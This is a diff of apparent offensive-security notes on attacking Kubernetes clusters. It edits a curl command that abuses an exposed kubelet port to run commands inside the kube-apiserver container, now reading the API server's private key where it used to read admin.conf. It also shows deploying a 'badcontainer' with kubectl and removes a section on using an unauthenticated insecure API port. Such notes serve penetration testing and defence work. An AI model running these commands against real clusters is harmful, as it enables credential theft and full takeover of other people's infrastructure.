@@ -41,19 +41,13 @@ Attacking the main kubelet port we can do a lot more, if it's exposed.
 
 https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver/
 
-curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/admin.conf"
+curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/apiserver.key"
 
 # Using Service Tokens
 
 kubectl run badcontainer --image=192.168.200.50:5000/alpine-containertools
 
 No config needed, it just knows where to go.
-
-## Attacking the API Server
-
-Externally you'd expect most clusters to require authentication externally, however if the well named "insecure port" is exposed on port 8080 it's relatively simple to get access
-
-kubectl -s=http://192.168.200.10:8080 get nodes
 
 ## Attacking etcd
 
